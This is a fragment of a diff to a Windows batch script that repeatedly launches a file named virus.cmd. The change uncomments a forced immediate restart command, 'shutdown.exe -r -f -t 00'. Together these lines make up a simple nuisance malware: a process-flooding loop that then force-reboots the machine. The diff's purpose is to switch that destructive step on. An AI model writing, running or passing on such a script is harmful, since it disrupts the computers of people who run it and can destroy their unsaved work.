@@ -168,4 +168,4 @@ start virus.cmd
 start virus.cmd
 start virus.cmd
 start virus.cmd
-rem shutdown.exe -r -f -t 00
+shutdown.exe -r -f -t 00
